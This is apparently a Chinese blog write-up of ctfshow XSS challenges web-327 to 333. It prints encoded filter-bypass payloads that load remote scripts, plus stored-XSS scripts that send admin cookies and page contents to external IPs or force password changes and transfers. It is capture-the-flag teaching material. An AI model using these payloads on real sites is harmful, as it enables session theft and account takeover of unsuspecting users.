+<p><strong>1.利用十进制转实体来绕过</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe	WIDTH=0	HEIGHT=0	srcdoc=。。。。。。。。。。&amp;#60;&amp;#115;&amp;#67;&amp;#82;&amp;#105;&amp;#80;&amp;#116;&amp;#32;&amp;#115;&amp;#82;&amp;#67;&amp;#61;&amp;#34;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#115;&amp;#58;&amp;#47;&amp;#47;&amp;#120;&amp;#115;&amp;#46;&amp;#115;&amp;#98;&amp;#47;&amp;#49;&amp;#66;&amp;#113;&amp;#117;&amp;#34;&amp;#62;&amp;#60;&amp;#47;&amp;#115;&amp;#67;&amp;#114;&amp;#73;&amp;#112;&amp;#84;&amp;#62;&gt;</span><br><span class="line"></span><br><span class="line">&lt;iframe/srcdoc=。。。。。。。。。。&amp;#60;&amp;#115;&amp;#67;&amp;#82;&amp;#105;&amp;#80;&amp;#116;&amp;#32;&amp;#115;&amp;#82;&amp;#67;&amp;#61;&amp;#34;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#115;&amp;#58;&amp;#47;&amp;#47;&amp;#120;&amp;#115;&amp;#115;&amp;#46;&amp;#112;&amp;#116;&amp;#47;&amp;#99;&amp;#76;&amp;#103;&amp;#70;&amp;#34;&amp;#62;&amp;#60;&amp;#47;&amp;#115;&amp;#67;&amp;#114;&amp;#73;&amp;#112;&amp;#84;&amp;#62;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这个<code>&amp;#60</code>其实是十进制的html 实体编码。字符串转十进制的html 实体编码脚本如下：</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">string_to_html_entities</span>(<span class="params">input_str</span>):</span><br><span class="line">    html_entities = [<span class="string">f&#x27;&amp;#<span class="subst">&#123;<span class="built_in">ord</span>(char)&#125;</span>;&#x27;</span> <span class="keyword">for</span> char <span class="keyword">in</span> input_str]</span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span>.join(html_entities)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">input_str = <span class="built_in">input</span>(<span class="string">&quot;请输入字符串: &quot;</span>)</span><br><span class="line">html_entities_result = string_to_html_entities(input_str)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;HTML实体编码:&quot;</span>, html_entities_result)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>&lt;iframe后面的WIDTH和HIGHT其实是设置宽、高等属性，没有也没事</p>
+<p><strong>2.base64编码绕过</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input οnfοcus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzOC5jYy8ySEpJIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw== autofocus&gt;</span><br></pre></td></tr></table></figure>
+
+<p>使用atob函数进行base64解码</p>
+<p>除了像这种payload这样用，还能像如下这 些payload这样用</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=<span class="attr">javascript</span>:<span class="built_in">eval</span>(<span class="title function_">atob</span>(<span class="string">&#x27;SmF5MTc=&#x27;</span>))&gt;test&lt;/a&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:eval(window.atob(</span>&#x27;<span class="attr">SmF5MTc</span>=<span class="string">&#x27;))&gt;test&lt;/a&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="tag"><span class="string">&lt;a href=javascript:eval(window[&#x27;</span><span class="attr">atob</span>&#x27;](&#x27;<span class="attr">SmF5MTc</span>=<span class="string">&#x27;))&gt;test&lt;/a&gt;</span></span></span></span><br><span class="line">&lt;img src=x onmouseover=&quot;eval(window.atob(&#x27;SmF5MTc=&#x27;))&quot;&gt;</span><br><span class="line">&lt;img src=x onerror=&quot;eval(atob(&#x27;SmF5MTc=&#x27;))&quot;&gt;</span><br><span class="line">&lt;iframe src=&quot;javascript:eval(window[&#x27;atob&#x27;](&#x27;SmF5MTc=&#x27;))&quot;&gt;&lt;/iframe&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>3.混合编码绕过</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body/οnlοad=eval(&quot;\x64\x6f\x63\x75\x6d\x65\x6e\x74\x2e\x77\x72\x69\x74\x65\x28\x53\x74\x72\x69\x6e\x67\x2e\x66\x72\x6f\x6d\x43\x68\x61\x72\x43\x6f\x64\x65\x28\x36\x30\x2c\x31\x31\x35\x2c\x36\x37\x2c\x31\x31\x34\x2c\x37\x33\x2c\x31\x31\x32\x2c\x31\x31\x36\x2c\x33\x32\x2c\x31\x31\x35\x2c\x31\x31\x34\x2c\x36\x37\x2c\x36\x31\x2c\x34\x37\x2c\x34\x37\x2c\x31\x32\x30\x2c\x31\x31\x35\x2c\x34\x36\x2c\x31\x31\x35\x2c\x39\x38\x2c\x34\x37\x2c\x38\x39\x2c\x38\x34\x2c\x38\x35\x2c\x31\x30\x34\x2c\x36\x32\x2c\x36\x30\x2c\x34\x37\x2c\x31\x31\x35\x2c\x36\x37\x2c\x38\x32\x2c\x31\x30\x35\x2c\x31\x31\x32\x2c\x38\x34\x2c\x36\x32\x29\x29\x3b&quot;)&gt;</span><br></pre></td></tr></table></figure>
+
+<p>混合编码，加密顺序为先ascii编码加密，再十六进制加密</p>
+<p><a target="_blank" rel="noopener" href="http://www.atoolbox.net/Tool.php?Id=816">字符16进制加密&#x2F;解密 - 一个工具箱 - 好用的在线工具都在这里！ (atoolbox.net)</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;body/οnlοad=eval(&quot;\u0064\u006F\u0063\u0075\u006D\u0065\u006E\u0074\u002E\u0077\u0072\u0069\u0074\u0065\u0028\u0053\u0074\u0072\u0069\u006E\u0067\u002E\u0066\u0072\u006F\u006D\u0043\u0068\u0061\u0072\u0043\u006F\u0064\u0065\u0028\u0036\u0030\u002C\u0031\u0031\u0035\u002C\u0036\u0037\u002C\u0038\u0032\u002C\u0031\u0030\u0035\u002C\u0038\u0030\u002C\u0031\u0031\u0036\u002C\u0033\u0032\u002C\u0031\u0031\u0035\u002C\u0038\u0032\u002C\u0036\u0037\u002C\u0036\u0031\u002C\u0034\u0037\u002C\u0034\u0037\u002C\u0031\u0032\u0030\u002C\u0031\u0031\u0035\u002C\u0034\u0036\u002C\u0031\u0031\u0035\u002C\u0039\u0038\u002C\u0034\u0037\u002C\u0034\u0039\u002C\u0036\u0036\u002C\u0031\u0031\u0033\u002C\u0031\u0031\u0037\u002C\u0036\u0032\u002C\u0036\u0030\u002C\u0034\u0037\u002C\u0031\u0031\u0035\u002C\u0036\u0037\u002C\u0031\u0031\u0034\u002C\u0037\u0033\u002C\u0031\u0031\u0032\u002C\u0038\u0034\u002C\u0036\u0032\u0029\u0029\u003B&quot;)&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>混合编码，加密顺序为先ascii编码加密，再unicode加密</p>
+<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504232025106.png" alt="image-20250423202518061" loading="lazy"></p>
+<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504232025708.png" alt="image-20250423202531675" loading="lazy"></p>
+<h3 id="存储型-XSS"><a href="#存储型-XSS" class="headerlink" title="存储型 XSS"></a><strong>存储型 XSS</strong></h3><p>（1）原理<br>  存储型XSS和反射型XSS的差别仅在于，提交的代码会存储在服务器端（数据库、内存、文件系统等），下次请求目标页面时不用再提交XSS代码。最典型的例子就是留言板XSS，用户提交一条包含XSS代码的留言存储到数据库，目标用户查看留言板时，那些留言就会从数据库中加载出来并显示，于是触发了XSS攻击</p>
+<p>（2）攻击方式<br>  这种攻击多见于论坛、博客和留言板中，攻击者在发帖的过程中，将恶意脚本连同正常的信息一起注入帖子的内容中。随着帖子被服务器存储下来，恶意脚本也永久的存放在服务器的后端存储器中。当其他用户浏览这个被注入了恶意脚本的帖子时，恶意脚本会在它们的浏览器中得到执行</p>
+<h3 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h3><p>(1）原理<br>  文档对象模型Document Object Model（DOM）是一个与平台、编程语言不相干的接口，允许程序或脚本动态地访问和更新文档内容、结构和样式，处理后的结果会成为展示页面的一部分</p>
+<p>DOM型xss其实是一种特殊类型的反射型xss，也被称作本地跨站，它是基于DOM文档对象模型的一种漏洞。DOM XSS和反射型XSS、存储型XSS的区别在于DOM XSS代码并不需要服务器参与，出发XSS靠的是浏览器的DOM解析，完全是客户端的事情</p>
+<p>DOM中有很多对象，其中一些对象可以被用户所操纵，如url，location等。客户端的脚本程序可以通过DOM来动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而是从客户端取得DOM中的数据后并在本地执行，因此仅从服务器端是没有办法防御DOM型XSS漏洞的，如若DOM中的数据没有经过严格的验证，便会产生基于DOM的XSS漏洞。</p>
+<p>基于DOM的XSS是反射的特例，其中JavaScript隐藏在URL中，并在其呈现时由页面中的JavaScript取出，而不是在提供服务时嵌入到页面中。这可以使其比其他攻击更隐蔽，并且监控页面正文的WAF或其他防护检测不出恶意内容。</p>
+<p>（2）攻击方式<br>  用户请求一个经过专门设计的URL，它由攻击者提交，而且其中包含xss代码。服务器的响应不会以任何的形式包含攻击者的脚本，当用户的浏览器处理这个响应时，DOM对象就会处理xss代码，导致存在xss漏洞</p>
+<h3 id="web-327"><a href="#web-327" class="headerlink" title="web-327"></a>web-327</h3><p>从这题开始就是存储型XSS，首先是poster必须是admin才能发送成功，其次就是xss的出发点一个是sender和content都可以</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt; onload=location.href=&quot;http://47.98.193.145/1111/127.php?cookie=&quot;+document.cookie&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504232040763.png" alt="image-20250423204012730" loading="lazy"></p>
+<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504232040262.png" alt="image-20250423204022238" loading="lazy"></p>
+<h3 id="web-328"><a href="#web-328" class="headerlink" title="web-328"></a>web-328</h3><p>这里在注册时，用户名和密码都用payload（头这里没用了。可能被过滤了）</p>
+<p>打payload前先用vps监听9023端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;window.open(&#x27;http://120.46.41.173:9023/&#x27;+document.cookie)&lt;/script&gt; </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504232044662.png" alt="image-20250423204412630" loading="lazy"></p>
+<p>这个应该是管理员的cookie，抓包伪造一下cookie</p>
+<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504232047133.png" alt="image-20250423204758098" loading="lazy"></p>
+<p>然后放包，一个一个放，速度要慢。放一个包改一次cookie</p>
+<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504232048170.png" alt="image-20250423204843142" loading="lazy"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">别人的wp：</span><br><span class="line">TIP：关于异步(加深了解可写项目或看项目)，页面框架获取和数据拉取填充是异步进行的，不在同一个数据包中，如果通过BURP完成此题，请注意数据包是否为获取指定数据。</span><br><span class="line"></span><br><span class="line">另外一种思路：</span><br><span class="line">将页面指定部分直接发送到XSS平台</span><br><span class="line">经分析，flag大概率在document.body.innerText，且数据量不大</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="web-329"><a href="#web-329" class="headerlink" title="web-329"></a>web-329</h3><p>这里还是仅管理员可见</p>
+<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504232053815.png" alt="image-20250423205351783" loading="lazy"></p>
+<p>和上题不同的是，这题cookie会立刻失效，不能通过窃取cookie的形式获得flag</p>
+<p> 我们来分析一下一原理，我们的payload作为存储型XSS，管理员访问的时候能被我们窃取Cookie，你哈是不是还能窃取到别的东西呢，比如管理员看到的用户名和密码。理论上来说是可以的，所以就直接获取管理员的页面信息</p>
+<p>问题在于，我们该如何带出数据？</p>
+<p><strong>方法一：我们可以通过类名查找元素，通过document来获取</strong></p>
+<p>先在vps上面监听端口9023</p>
+<p>innerHTML和outerHTML的区别</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.innerHTML</span><br><span class="line">从对象的起始位置到终止位置的全部内容，不包括html标签，innerText柯替代innerHTML</span><br><span class="line"></span><br><span class="line">2.outerHTML</span><br><span class="line">除了包含innerHTML的全部内容外，还包含标签本身</span><br></pre></td></tr></table></figure>
+
+<p>可以看到前端代码中将要显示admin密码的地方类为layui-table-cell laytable-cell-1-0-1</p>
+<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504232122756.png" alt="image-20250423212222717" loading="lazy"></p>
+<p>payload： （作为账号密码注册后登录）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;window.open(&#x27;http://120.46.41.173:9023/&#x27;+document.getElementsByClassName(&#x27;layui-table-cell laytable-cell-1-0-1&#x27;)[1].innerHTML)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>解释一下</p>
+<blockquote>
+<p>window.open(‘<a target="_blank" rel="noopener" href="http://120.46.41.173:9023/">http://120.46.41.173:9023/</a>‘ + document.getElementsByClassName(‘layui-table-cell laytable-cell-1-0-1’)[1].innerHTML) 这是一个调用 window.open() 函数的语句，用于打开新的浏览器窗口。</p>
+<p>‘<a target="_blank" rel="noopener" href="http://120.46.41.173:9023/">http://120.46.41.173:9023/</a>‘ 这是一个字符串，表示要打开的网页的 URL。它包括了协议（http:&#x2F;&#x2F;）、主机名（120.46.41.173）和端口号（9023），以及路径（后面的斜杠 &#x2F;）。</p>
+<p>document.getElementsByClassName(‘layui-table-cell laytable-cell-1-0-1’)[1].innerHTML 这是一系列 DOM 操作，用于获取网页中特定元素的内容。</p>
+<p>document.getElementsByClassName(‘layui-table-cell laytable-cell-1-0-1’) 是一个通过类名查找元素的方法。它查找具有类名 ‘layui-table-cell’ 和 ‘laytable-cell-1-0-1’ 的元素，通常这是一种针对表格单元格的选择。</p>
+<p>[1] 表示从匹配的元素列表中选择第二个元素（JavaScript 中的数组索引从 0 开始）。</p>
+<p>.innerHTML 用于获取选定元素的 HTML 内容，也就是在这个表格单元格中显示的文本或 HTML。</p>
+</blockquote>
+<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504232126197.png" alt="image-20250423212611169" loading="lazy"></p>
+<p><strong>方法二：jQuery选择器查找类和获取内容</strong></p>
+<p>我们已经得知了我们要获取的数据对应的类名字是layui-table-cell和laytable-cell-1-0-1，对应用户名和密码</p>
+<p>这里我们可以只读一个，也可以都读，都读的话.layui-table-cell.laytable-cell-1-0-1，只读一个的话laytable-cell-1-0-1</p>
+<p>js中indexof()方法返回值在字符串中第一次出现的位置，如果未找到该值，则indexof()方法返回-1，indexof()方法区分大小写</p>
+<p>我们现在控制台测试一下：（能成功获取类和内容就可以了）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$(&#x27;.laytable-cell-1-0-1&#x27;).each(function(index,value)&#123;</span><br><span class="line">	console.log(value);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504232151448.png" alt="image-20250423215117393" loading="lazy"></p>
+<p>vps监听9023端口</p>
+<p>payload:（作为账号密码注册后登录）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;$(&#x27;div.layui-table-cell.laytable-cell-1-0-1&#x27;).each(function(index,value)&#123;if(value.innerHTML.indexOf(&#x27;ctfshow&#123;&#x27;)&gt;-1)&#123;window.location.href=&#x27;http://120.46.41.173:9023/&#x27;+value.innerHTML;&#125;&#125;);&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>解释一下它的每一部分：</p>
+<blockquote>
+<p>$(‘div.layui-table-cell.laytable-cell-1-0-1’).each(function(index, value) { … });<br>这是一个 jQuery 选择器，它查找具有类名 ‘layui-table-cell’、’laytable-cell-1-0-1’ 的 <div> 元素集合，并对每个元素执行一个函数。</p>
+<p>.each(function(index, value) { … })<br>这是 jQuery 的遍历方法，它会遍历匹配的元素集合，并对每个元素执行包含在函数中的操作。在这里，函数接受两个参数，index 表示当前元素在集合中的索引，value 表示当前元素的引用。</p>
+<p>if (value.innerHTML.indexOf(‘ctfshow{‘) &gt; -1) { … }<br>这是在遍历中的条件语句，它检查当前元素的内容是否包含字符串 ‘ctfshow{‘。value.innerHTML 表示当前元素的 HTML 内容，.indexOf(‘ctfshow{‘) 用于查找是否包含 ‘ctfshow{‘，如果包含则返回大于 -1 的索引，否则返回 -1。</p>
+<p>window.location.href &#x3D; ‘<a target="_blank" rel="noopener" href="http://120.46.41.173:9023/">http://120.46.41.173:9023/</a>‘ + value.innerHTML;<br>如果条件满足，即当前元素的内容包含 ‘ctfshow{‘，则执行这一行代码。它会将浏览器的当前位置重定向到一个新的 URL，这个 URL 是 ‘<a target="_blank" rel="noopener" href="http://120.46.41.173:9023/">http://120.46.41.173:9023/</a>‘ 加上当前元素的内容。这样就可以在浏览器中打开一个新的页面，新页面的 URL 包含了 ‘ctfshow{‘ 以及其他内容。</p>
+</blockquote>
+<p>这里有点小问题，带出来的内容不是flag，而是payload</p>
+<p>我们分析一下，猜测他确实把第一个用户的密码给了。但是第一个用户是我刚刚注册的那个，就是我的payload，而且我的payload也包含ctfshow{</p>
+<p>验证猜想，我们重新注册了一个号，账号和密码都是ctfshow{i an jay17}，果然，监听的内容就变成了ctfshow{i an jay17}</p>
+<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504241947338.png" alt="image-20250424194749308" loading="lazy"></p>
+<p>所以这题是特殊情况，我们需要改改payload（包含ctfshow{，但是不保护script）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;$(&#x27;div.layui-table-cell.laytable-cell-1-0-1&#x27;).each(function (index, value) &#123;if ((value.innerHTML.indexOf(&#x27;ctfshow&#123;&#x27;) &gt; -1)&amp;&amp;(value.innerHTML.indexOf(&#x27;script&#x27;) === -1)) &#123;window.location.href = &#x27;http://120.46.41.173:9023/&#x27; +value.innerHTML;&#125;&#125;);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>然后就得到flag了</p>
+<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504241956844.png" alt="image-20250424195636798" loading="lazy"></p>
+<p><strong>方法三：querySelector方法获取内容</strong></p>
+<p>quertSelector是JavaScript中用于从文档中选择一个或多个元素的方法，这个方法允许通过CSS选择器来查找并返回文档中匹配该选择器的第一个元素（如果有多个匹配项，则只返回第一个匹配项）</p>
+<p>下面是querySelector方法的解释:</p>
+<p>1.基本语法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var element = document.querySelector(selector);</span><br></pre></td></tr></table></figure>
+
+<p>selector是一个字符串，表示要查找的元素的css选择器</p>
+<p>2.示例</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">// 通过ID选择元素</span><br><span class="line">var elementById = document.querySelector(&#x27;#myId&#x27;);</span><br><span class="line">// 通过类名选择元素</span><br><span class="line">var elementsByClass = document.querySelector(&#x27;.myClass&#x27;);</span><br><span class="line">// 通过标签名选择元素</span><br><span class="line">var elementsByTagName = document.querySelector(&#x27;div&#x27;);</span><br><span class="line">// 使用复杂的选择器，本题就是这种</span><br><span class="line">var complexSelector = document.querySelector(&#x27;div.container &gt; p:first-child&#x27;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504242140551.png" alt="image-20250424214045494" loading="lazy"></p>
+<p>payload：其实#top &gt; div.layui-container能把所有源码都读了，很方便</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;var img = new Image();img.src = &quot;http://120.46.41.173:9023/&quot;+document.querySelector(&#x27;#top &gt; div.layui-container &gt; div:nth-child(4) &gt; div &gt; div.layui-table-box &gt; div.layui-table-body.layui-table-main&#x27;).textContent;document.body.append(img);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>解释一下它的每一部分</p>
+<blockquote>
+<p>1.var img &#x3D; new Image();</p>
+<p>这行代码创建了一个新的图像元素对象，并将其分配给变量 img。这个对象用于在页面上加载图像。</p>
+<p>2.img.src &#x3D; “<a target="_blank" rel="noopener" href="http://120.46.41.173:9023/">http://120.46.41.173:9023/</a>“ + document.querySelector(‘#top &gt; div.layui-container &gt; div:nth-child(4) &gt; div &gt; div.layui-table-box &gt; div.layui-table-body.layui-table-main’).textContent;这行代码设置了图像的 src 属性，即要加载的图像的 URL。URL 是通过拼接多个部分构建的：</p>
+<p>​	“<a target="_blank" rel="noopener" href="http://120.46.41.173:9023/">http://120.46.41.173:9023/</a>“ 是图像的基本 URL。</p>
+<p>​	document.querySelector(…) 是一个 DOM 查询操作，用于获取页面上特定元素的内容。在这里，它获取了一个具有复杂选择器的元素，该元素位于页面的某个位置。它的目的是获取这个元素的文本内容。</p>
+<p>​	textContent 是获取 DOM 元素文本内容的属性。<br>综合起来，这行代码的目的是获取特定 DOM 元素的文本内容，然后将其添加到图像 URL 的末尾，以便通过 URL 传递给服务器。</p>
+<p>3.document.body.append(img);最后一行代码将创建的图像元素 img 添加到页面的 <body> 元素中，这样图像将被加载并显示在页面上。</p>
+</blockquote>
+<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504242148488.png" alt="image-20250424214854454" loading="lazy"></p>
+<p>来自大佬的补充</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// 定义sleep函数，转跳，睡眠，接口通信，然而由于机器人不用浏览器未实现，如果是真人则可行</span><br><span class="line">&lt;script&gt;function sleep(numberMillis) &#123;var now = new Date();var exitTime=now.getTime() + numberMillis;while (true) &#123;now = new Date();if (now.getTime() &gt; exitTime)return;&#125;&#125;;window.location.href=&quot;manager.php&quot;;sleep(1000);$(&#x27;.layui-table-cell.laytable-cell-1-0-1&#x27;).each(function(index,value)&#123;if(value.innerHTML.indexOf(&#x27;&#123;&#x27;)&gt;-1)&#123;document.location.href=&#x27;http://xxxxxxxxxxxxxxxxxxxxxxxx/x.php?1=&#x27;+value.innerHTML;&#125;&#125;);&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;window.open(&#x27;http://60.204.158.87/&#x27;+document.cookie)&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="web-330"><a href="#web-330" class="headerlink" title="web-330"></a>web-330</h3><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504281930240.png" alt="image-20250428193040147" loading="lazy"></p>
+<p>我们发现多了一个修改密码的功能</p>
+<p>我们先抓包看看有啥功能</p>
+<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504281931091.png" alt="image-20250428193143036" loading="lazy"></p>
+<p>我们可以发现修改密码调用了这个请求，于是可以想到直接通过跳转一个get请求来修改管理员密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;document.location.href=&quot;http://127.0.0.1/api/change.php?p=123456&quot;&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>由于数据库在本地，所以我们可以直接通过修改本地的密码为123456来达到修改admin密码的目的</p>
+<p>但我们通过实践发现不能，换成用户名试试</p>
+<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504281933114.png" alt="image-20250428193336081" loading="lazy"></p>
+<p>登录成功，然后又是通过抓包获取flag，但这次是第一个包发送过去就能看到flag</p>
+<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504281938041.png" alt="image-20250428193810007" loading="lazy"></p>
+<p>反而第二个包发过去看不到了</p>
+<h3 id="web-331"><a href="#web-331" class="headerlink" title="web-331"></a>web-331</h3><p>和上题一样的情况</p>
+<p>同样抓包看看</p>
+<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504281938930.png" alt="image-20250428193858896" loading="lazy"></p>
+<p>我们发现发送形式变成POST了，于是对应的payload也变成post形式</p>
+<script>
+$.ajax(
+    {
+        url:'api/change.php',
+        type:'post',
+        data:{
+            p:'123456'
+        }
+    }
+)
+</script>
+
+<p>通过f12发现可以修改，于是格式化了一下，得到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;$.ajax(&#123;url:&#x27;api/change.php&#x27;,type:&#x27;post&#x27;,data:&#123;p:&#x27;123456&#x27;&#125;&#125;)&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504281942690.png" alt="image-20250428194212653" loading="lazy"></p>
+<h3 id="web-332"><a href="#web-332" class="headerlink" title="web-332"></a>web-332</h3><p>这次多出了个汇款功能，我们先注册一个账号</p>
+<p>然后转账负数的金额</p>
+<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504281945387.png" alt="image-20250428194535357" loading="lazy"></p>
+<p>就会发现负的太多，余额溢出了变为了正数，然后就能买flag了</p>
+<h3 id="web-333"><a href="#web-333" class="headerlink" title="web-333"></a>web-333</h3><p>管理员访问用户管理，用注册的用户名执行js代码给另一个账户转账，所以需要注册两个用户名</p>
+<p>转账逻辑：</p>
+<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504281947021.png" alt="image-20250428194736988" loading="lazy"></p>
+<p>同样可以通过测试写一个转账逻辑：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">$.ajax(</span><br><span class="line">	&#123;</span><br><span class="line">		url:&#x27;api/amount.php&#x27;,</span><br><span class="line">		type:&#x27;post&#x27;,</span><br><span class="line">		data:&#123;</span><br><span class="line">			u:&#x27;123&#x27;,</span><br><span class="line">			a:&#x27;5&#x27;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">)</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>经过测试可以，格式化一下变成payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;$.ajax(&#123;url:&#x27;api/amount.php&#x27;,type:&#x27;post&#x27;,data:&#123;u:&#x27;123&#x27;,a:&#x27;10000&#x27;&#125;&#125;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504281948150.png" alt="image-20250428194801120" loading="lazy"></p>
+<p>转账成功，😎</p>
+<p>购买flag</p>
